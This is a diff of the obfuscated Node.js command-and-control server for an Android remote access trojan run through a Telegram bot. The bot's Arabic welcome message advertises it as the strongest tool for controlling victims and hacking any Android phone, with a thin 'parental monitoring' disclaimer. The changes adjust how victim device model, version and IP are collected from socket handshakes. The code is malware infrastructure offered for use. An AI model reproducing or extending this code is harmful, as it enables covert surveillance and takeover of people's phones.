@@ -7,7 +7,7 @@ const express = require('express'),
   fs = require('fs'),
   app = express(),
   server = http.createServer(app),
-  io = new Server(server, { cors: { origin: '*' } }),
+  io = new Server(server),
   uploader = multer(),
   data = JSON.parse(fs.readFileSync('./data.json', 'utf8')),
   bot = new telegramBot(data.token, { polling: true }),
@@ -63,9 +63,10 @@ app.post('/upload', uploader.single('file'), (_0x504b1c, _0x252371) => {
 })
 io.on('connection', (_0x5c13cb) => {
   let _0x444e7d =
-      (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.model ? _0x5c13cb.handshake.query.model : 'unknown') + '-' + io.sockets.sockets.size,
-    _0x5d119c = (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.version) ? _0x5c13cb.handshake.query.version : 'no information',
-    _0x76c6b1 = (_0x5c13cb.handshake.query && _0x5c13cb.handshake.query.ip) ? _0x5c13cb.handshake.query.ip : 'no information'
+      _0x5c13cb.handshake.headers.model + '-' + io.sockets.sockets.size ||
+      'no information',
+    _0x5d119c = _0x5c13cb.handshake.headers.version || 'no information',
+    _0x76c6b1 = _0x5c13cb.handshake.headers.ip || 'no information'
   _0x5c13cb.model = _0x444e7d
   _0x5c13cb.version = _0x5d119c
   let _0x35ea49 =
@@ -138,7 +139,7 @@ bot.on('message', (_0x517bec) => {
   if (_0x517bec.text === '/start') {
     bot.sendMessage(
       data.id,
-      '<b>\u272F اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 5</b>\n\nبوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم باي هاتف أندرويد \nتم تطوير البوت من قبل الهكر ال\u2022 \uD80C\uDDA9\uD81A\uDC61\uD80C\uDFFA\uD800\uDFD3َِ ч є х σ \uD80C\uDFFA\uD81A\uDC61\uD80C\uDDAA \u2022  تم تطويره لاجل التسليه والراقابه الابوايه فل المطور لا يتحمل مسؤولية سو استخدمه فيما يغضب الله @S7_MX3 \n\nتواصل بل المطور : @V2P_1 ',
+      '<b>\u272F اهلآ وسهلا في اقوى بوت تحكم بضحايا الإصدار 5</b>\n\nبوت رات قوي وسهل الاستخدام لاتحتاج الا كمبيوتر لاجل اختراق الاجهزه فبهذا البوت يمكنك التحكم باي هاتف أندرويد \nتم تطوير البوت من قبل الهكر ال\u2022 \uD80C\uDDA9\uD81A\uDC61\uD80C\uDFFA\uD800\uDFD3َِ ч є х σ \uD80C\uDFFA\uD81A\uDC61\uD80C\uDDAA \u2022  تم تطويره لاجل التسليه والراقابه الابوايه فل المطور لا يتحمل مسؤولية سو استخدمه فيما يغضب الله @S7_MX3 \n\nللتواصل مع المطور : @V2P_1',
       {
         parse_mode: 'HTML',
         reply_markup: {
